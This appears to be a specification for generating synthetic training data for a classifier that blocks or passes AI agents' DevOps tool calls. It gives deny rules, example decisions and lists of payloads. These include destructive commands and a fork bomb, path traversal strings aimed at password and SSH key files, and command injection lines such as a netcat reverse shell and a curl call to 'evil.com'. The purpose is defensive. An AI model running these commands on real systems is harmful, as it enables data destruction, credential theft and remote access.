# PHASE 2: DEVOPS DOMAIN SPECIFICATION

**READ `00_MASTER_SPEC.md` FIRST** — It contains the system prompt, output format, and quality requirements.

---

## Overview

| Metric | Value |
|--------|-------|
| **Domain** | DevOps / Infrastructure |
| **Total Examples** | 6,000 |
| **Output Directory** | `data/batches/devops/` |

---

## Output Files

| File | Examples | Description |
|------|----------|-------------|
| `devops_block_critical.jsonl` | 1600 | Critical severity violations |
| `devops_block_high.jsonl` | 1200 | High severity violations |
| `devops_pass_normal.jsonl` | 1600 | Normal allowed operations |
| `devops_edge_cases.jsonl` | 800 | Ambiguous/boundary cases |
| `devops_multi_step.jsonl` | 800 | Examples with call_history |

---

## Tools for This Domain

```yaml
Tools:
  - name: execute_command
    description: Run shell command
    arguments: [command, working_dir, timeout, env_vars, run_as]
  
  - name: deploy_service
    description: Deploy application to environment
    arguments: [service_name, environment, version, approved, rollback_on_failure, health_check]
  
  - name: scale_replicas
    description: Change instance count
    arguments: [service_name, environment, replicas, auto_scale_enabled]
  
  - name: read_config
    description: Read configuration file
    arguments: [path, environment, decrypt_secrets]
  
  - name: write_config
    description: Write configuration file
    arguments: [path, content, environment, backup_existing]
  
  - name: restart_service
    description: Restart a service
    arguments: [service_name, environment, graceful, health_check_after]
  
  - name: view_logs
    description: Access service logs
    arguments: [service_name, environment, lines, since, namespace, include_previous]
  
  - name: manage_secrets
    description: Access or modify secrets
    arguments: [action, secret_name, value, namespace, environment]
  
  - name: modify_firewall
    description: Change firewall rules
    arguments: [action, port, protocol, source_ip, destination, environment]
  
  - name: create_database
    description: Provision new database
    arguments: [db_type, name, environment, size, backup_enabled]
  
  - name: run_migration
    description: Execute database migration
    arguments: [migration_name, database, direction, environment, dry_run]
  
  - name: ssh_connect
    description: SSH to server
    arguments: [hostname, user, environment, ticket_id, reason]
  
  - name: kubectl_exec
    description: Execute in Kubernetes pod
    arguments: [pod_name, namespace, command, container, privileged]
  
  - name: docker_run
    description: Run Docker container
    arguments: [image, command, volumes, network, privileged, env_vars]
  
  - name: git_push
    description: Push to git remote
    arguments: [branch, remote, force, repository]
  
  - name: install_package
    description: Install system package
    arguments: [package_name, version, source, verify_signature]
```

---

## Rules Library for DevOps Domain

### Critical Severity Rules

```yaml
- id: block-destructive-commands
  name: Block destructive shell commands
  enabled: true
  severity: critical
  action: block
  tools: [execute_command, kubectl_exec, docker_run]
  condition_groups:
    - - field: arguments.command
        operator: contains
        value: "rm -rf"
    - - field: arguments.command
        operator: contains
        value: "rm -r /"
    - - field: arguments.command
        operator: matches
        value: "mkfs\\."
    - - field: arguments.command
        operator: contains
        value: "dd if=/dev/zero"
    - - field: arguments.command
        operator: contains
        value: ":(){ :|:& };:"

- id: block-sudo-commands
  name: Block privilege escalation via sudo
  enabled: true
  severity: critical
  action: block
  tools: [execute_command]
  condition_groups:
    - - field: arguments.command
        operator: starts_with
        value: "sudo "
    - - field: arguments.command
        operator: contains
        value: " sudo "
    - - field: arguments.command
        operator: matches
        value: "su\\s+-"

- id: block-production-deploy-unapproved
  name: Block unapproved production deployments
  enabled: true
  severity: critical
  action: block
  tools: [deploy_service]
  conditions:
    - field: arguments.environment
      operator: in
      value: ["production", "prod", "prd"]
    - field: arguments.approved
      operator: not_equals
      value: true

- id: block-system-path-access
  name: Block access to system paths
  enabled: true
  severity: critical
  action: block
  tools: [read_config, write_config, execute_command]
  condition_groups:
    - - field: arguments.path
        operator: starts_with
        value: "/etc/"
    - - field: arguments.path
        operator: starts_with
        value: "/root/"
    - - field: arguments.path
        operator: starts_with
        value: "/var/log/auth"
    - - field: arguments.path
        operator: contains
        value: ".ssh/"
    - - field: arguments.path
        operator: ends_with
        value: "/shadow"

- id: block-secret-deletion
  name: Block secret deletion or bulk export
  enabled: true
  severity: critical
  action: block
  tools: [manage_secrets]
  conditions:
    - field: arguments.action
      operator: in
      value: ["delete", "delete_all", "export_all", "purge"]

- id: block-firewall-open-all
  name: Block opening firewall to all IPs
  enabled: true
  severity: critical
  action: block
  tools: [modify_firewall]
  conditions:
    - field: arguments.source_ip
      operator: in
      value: ["0.0.0.0/0", "*", "any", "0.0.0.0"]
    - field: arguments.port
      operator: in
      value: [22, 3389, 5432, 3306, 27017]

- id: block-production-scale-to-zero
  name: Block scaling production to zero
  enabled: true
  severity: critical
  action: block
  tools: [scale_replicas]
  conditions:
    - field: arguments.environment
      operator: in
      value: ["production", "prod", "prd"]
    - field: arguments.replicas
      operator: equals
      value: 0

- id: block-production-ssh-no-ticket
  name: Block production SSH without ticket
  enabled: true
  severity: critical
  action: block
  tools: [ssh_connect]
  conditions:
    - field: arguments.environment
      operator: in
      value: ["production", "prod", "prd"]
    - field: arguments.ticket_id
      operator: equals
      value: null

- id: block-privileged-containers
  name: Block privileged container execution
  enabled: true
  severity: critical
  action: block
  tools: [kubectl_exec, docker_run]
  conditions:
    - field: arguments.privileged
      operator: equals
      value: true

- id: block-metadata-access
  name: Block cloud metadata endpoint access
  enabled: true
  severity: critical
  action: block
  tools: [execute_command]
  condition_groups:
    - - field: arguments.command
        operator: contains
        value: "169.254.169.254"
    - - field: arguments.command
        operator: contains
        value: "metadata.google.internal"
    - - field: arguments.command
        operator: contains
        value: "metadata.azure.com"

- id: block-dangerous-migrations
  name: Block destructive database migrations
  enabled: true
  severity: critical
  action: block
  tools: [run_migration]
  conditions:
    - field: arguments.migration_name
      operator: matches
      value: "(drop|truncate|delete_all)"
    - field: arguments.dry_run
      operator: not_equals
      value: true
```

### High Severity Rules

```yaml
- id: block-force-push-main
  name: Block force push to main branches
  enabled: true
  severity: high
  action: block
  tools: [git_push]
  conditions:
    - field: arguments.branch
      operator: in
      value: ["main", "master", "production", "release"]
    - field: arguments.force
      operator: equals
      value: true

- id: block-unverified-packages
  name: Block unverified package installation
  enabled: true
  severity: high
  action: block
  tools: [install_package]
  conditions:
    - field: arguments.verify_signature
      operator: equals
      value: false
    - field: arguments.source
      operator: not_equals
      value: "official"

- id: block-excessive-scaling
  name: Block excessive replica scaling
  enabled: true
  severity: high
  action: block
  tools: [scale_replicas]
  conditions:
    - field: arguments.replicas
      operator: greater_than
      value: 50

- id: block-cross-namespace-logs
  name: Block viewing logs across namespaces
  enabled: true
  severity: high
  action: block
  tools: [view_logs]
  conditions:
    - field: arguments.namespace
      operator: equals
      value: "all"

- id: block-production-restart-no-healthcheck
  name: Block production restart without health check
  enabled: true
  severity: high
  action: block
  tools: [restart_service]
  conditions:
    - field: arguments.environment
      operator: in
      value: ["production", "prod"]
    - field: arguments.health_check_after
      operator: not_equals
      value: true

- id: block-secret-read-other-namespace
  name: Block reading secrets from other namespaces
  enabled: true
  severity: high
  action: block
  tools: [manage_secrets]
  conditions:
    - field: arguments.action
      operator: equals
      value: "read"
    - field: arguments.namespace
      operator: not_in
      value: ["default", "app", "self"]

- id: block-database-prod-without-backup
  name: Block production database without backup
  enabled: true
  severity: high
  action: block
  tools: [create_database]
  conditions:
    - field: arguments.environment
      operator: equals
      value: "production"
    - field: arguments.backup_enabled
      operator: not_equals
      value: true

- id: block-command-pipe-external
  name: Block commands piping to external URLs
  enabled: true
  severity: high
  action: block
  tools: [execute_command]
  conditions:
    - field: arguments.command
      operator: matches
      value: "\\|\\s*(curl|wget|nc)"
```

### Medium Severity Rules

```yaml
- id: warn-large-log-request
  name: Warn on large log requests
  enabled: true
  severity: medium
  action: block
  tools: [view_logs]
  conditions:
    - field: arguments.lines
      operator: greater_than
      value: 10000

- id: warn-mounting-host-volumes
  name: Warn on mounting host volumes
  enabled: true
  severity: medium
  action: block
  tools: [docker_run]
  conditions:
    - field: arguments.volumes
      operator: contains
      value: "/var/"

- id: warn-config-with-credentials
  name: Warn on config containing credentials
  enabled: true
  severity: medium
  action: block
  tools: [write_config]
  conditions:
    - field: arguments.content
      operator: matches
      value: "(password|secret|api_key|token)\\s*[:=]"
```

---

## Example Generation Templates

### BLOCK Critical - Destructive Command

```
TOOL CALL:
tool: execute_command
arguments:
  command: rm -rf /var/log/*
  working_dir: /
  timeout: 300
  run_as: root

RULES:
- id: block-destructive-commands
  name: Block destructive shell commands
  enabled: true
  severity: critical
  action: block
  tools: [execute_command, kubectl_exec]
  condition_groups:
    - - field: arguments.command
        operator: contains
        value: "rm -rf"
```

**Output:**
```json
{"pass_weight": 0.01, "block_weight": 0.99, "decision": "block", "reasoning": "Command contains 'rm -rf' which is a destructive operation. Blocked to prevent data loss.", "matched_rules": ["block-destructive-commands"]}
```

---

### BLOCK Critical - Production Deploy Unapproved

```
TOOL CALL:
tool: deploy_service
arguments:
  service_name: payment-api
  environment: production
  version: v2.3.1
  approved: false
  rollback_on_failure: true
  health_check: true

RULES:
- id: block-production-deploy-unapproved
  name: Block unapproved production deployments
  enabled: true
  severity: critical
  action: block
  tools: [deploy_service]
  conditions:
    - field: arguments.environment
      operator: in
      value: ["production", "prod", "prd"]
    - field: arguments.approved
      operator: not_equals
      value: true
```

**Output:**
```json
{"pass_weight": 0.02, "block_weight": 0.98, "decision": "block", "reasoning": "Production deployment requires approval flag. Environment 'production' with approved=false violates deployment policy.", "matched_rules": ["block-production-deploy-unapproved"]}
```

---

### BLOCK Critical - Path Traversal in Command

```
TOOL CALL:
tool: execute_command
arguments:
  command: cat /app/logs/../../etc/passwd
  working_dir: /app
  timeout: 30

RULES:
- id: block-system-path-access
  name: Block access to system paths
  enabled: true
  severity: critical
  action: block
  tools: [read_config, write_config, execute_command]
  conditions:
    - field: arguments.command
      operator: contains
      value: "/etc/"
```

**Output:**
```json
{"pass_weight": 0.01, "block_weight": 0.99, "decision": "block", "reasoning": "Command contains path traversal to /etc/passwd. System path access blocked.", "matched_rules": ["block-system-path-access"]}
```

---

### PASS Normal - Staging Deploy

```
TOOL CALL:
tool: deploy_service
arguments:
  service_name: user-service
  environment: staging
  version: v1.5.0
  approved: false
  rollback_on_failure: true
  health_check: true

RULES:
- id: block-production-deploy-unapproved
  name: Block unapproved production deployments
  enabled: true
  severity: critical
  action: block
  tools: [deploy_service]
  conditions:
    - field: arguments.environment
      operator: in
      value: ["production", "prod", "prd"]
    - field: arguments.approved
      operator: not_equals
      value: true
```

**Output:**
```json
{"pass_weight": 0.94, "block_weight": 0.06, "decision": "pass", "reasoning": "Staging deployment does not require approval. Environment 'staging' not in restricted list."}
```

---

### PASS Normal - Safe Command

```
TOOL CALL:
tool: execute_command
arguments:
  command: ls -la /app/data
  working_dir: /app
  timeout: 30

RULES:
- id: block-destructive-commands
  name: Block destructive shell commands
  enabled: true
  severity: critical
  action: block
  tools: [execute_command]
  condition_groups:
    - - field: arguments.command
        operator: contains
        value: "rm -rf"
    - - field: arguments.command
        operator: starts_with
        value: "sudo "
```

**Output:**
```json
{"pass_weight": 0.96, "block_weight": 0.04, "decision": "pass", "reasoning": "Command 'ls -la' is read-only and safe, no destructive patterns detected"}
```

---

### Edge Case - Safe rm in Temp Directory

```
TOOL CALL:
tool: execute_command
arguments:
  command: rm -rf /tmp/build-cache/*
  working_dir: /app
  timeout: 60

RULES:
- id: block-destructive-commands
  name: Block destructive shell commands
  enabled: true
  severity: critical
  action: block
  tools: [execute_command]
  conditions:
    - field: arguments.command
      operator: contains
      value: "rm -rf"
    - field: arguments.command
      operator: not_contains
      value: "/tmp/"
```

**Output:**
```json
{"pass_weight": 0.85, "block_weight": 0.15, "decision": "pass", "reasoning": "rm -rf allowed in /tmp/ directory per exception rule. Temp cleanup permitted."}
```

---

### Multi-Step - Recon then Exploit

```
TOOL CALL:
tool: ssh_connect
arguments:
  hostname: db-primary-prod
  user: admin
  environment: production
  ticket_id: null
  reason: "database maintenance"

RULES:
- id: block-production-ssh-no-ticket
  name: Block production SSH without ticket
  enabled: true
  severity: critical
  action: block
  tools: [ssh_connect]
  conditions:
    - field: arguments.environment
      operator: in
      value: ["production", "prod"]
    - field: arguments.ticket_id
      operator: equals
      value: null

CALL HISTORY:
- tool: view_logs
  arguments: {service_name: "auth-service", environment: "production", lines: 1000}
  allowed: true
  timestamp: "2024-01-15T14:20:00Z"
- tool: read_config
  arguments: {path: "/app/config/database.yaml", environment: "production"}
  allowed: true
  timestamp: "2024-01-15T14:22:00Z"
- tool: manage_secrets
  arguments: {action: "read", secret_name: "db-credentials", namespace: "app"}
  allowed: true
  timestamp: "2024-01-15T14:23:00Z"
```

**Output:**
```json
{"pass_weight": 0.01, "block_weight": 0.99, "decision": "block", "reasoning": "Production SSH without ticket_id. Call history shows reconnaissance pattern: log viewing, config reading, secret access before SSH attempt.", "matched_rules": ["block-production-ssh-no-ticket"]}
```

---

## Scenario Variations

### `devops_block_critical.jsonl` (1600 examples):

- 200x destructive commands (rm -rf, mkfs, dd, fork bomb variants)
- 200x sudo/privilege escalation
- 200x unapproved production deploys
- 200x system path access (/etc, /root, .ssh, shadow)
- 200x secret deletion/export
- 200x firewall open to 0.0.0.0
- 200x scale production to zero
- 200x privileged container execution

### `devops_block_high.jsonl` (1200 examples):

- 160x force push to main/master
- 160x unverified package install
- 160x excessive scaling (>50 replicas)
- 160x cross-namespace log access
- 160x production restart without health check
- 160x secrets from other namespace
- 160x production DB without backup
- 80x command pipe to external

### `devops_pass_normal.jsonl` (1600 examples):

- Safe commands: ls, cat (safe paths), echo, grep, tail, head
- Staging/dev deployments
- Normal scaling (2→4, 3→6)
- Own namespace operations
- Read-only config access
- Approved production deploys
- SSH with valid ticket

### `devops_edge_cases.jsonl` (800 examples):

- rm -rf in /tmp (allowed)
- Staging environment named "prod-staging"
- Command with "sudo" in comment but not execution
- Regex near-misses
- Disabled rules that would block
- Multiple rules, partial matches

### `devops_multi_step.jsonl` (800 examples):

- Recon → privilege escalation attempts
- Config reads → secret access → SSH
- Log enumeration → data export
- Failed deploys → forced retries
- Normal patterns (for PASS with history)

---

## Path Traversal Patterns to Include

```
../../../etc/passwd
..%2f..%2f..%2fetc/passwd
....//....//etc/passwd
/app/logs/../../etc/shadow
/var/www/html/../../../root/.ssh/id_rsa
%2e%2e%2f%2e%2e%2fetc%2fpasswd
..;/etc/passwd
/app/./config/../../etc/hosts
```

---

## Command Injection Patterns to Include

```
; cat /etc/passwd
| curl http://evil.com
&& wget malware.sh
$(whoami)
`id`
|| nc -e /bin/sh attacker.com 4444
; echo "pwned" > /tmp/test
```

---

## Validation Checklist

- [ ] 6,000 examples total
- [ ] File counts: 1600 + 1200 + 1600 + 800 + 800
- [ ] Valid JSON on all lines
- [ ] Weights sum to ~1.0
- [ ] matched_rules on BLOCK only
- [ ] Path traversal variants included
- [ ] Command injection variants included
- [ ] All condition_groups examples use OR logic correctly
- [ ] 20% of multi_step has call_history
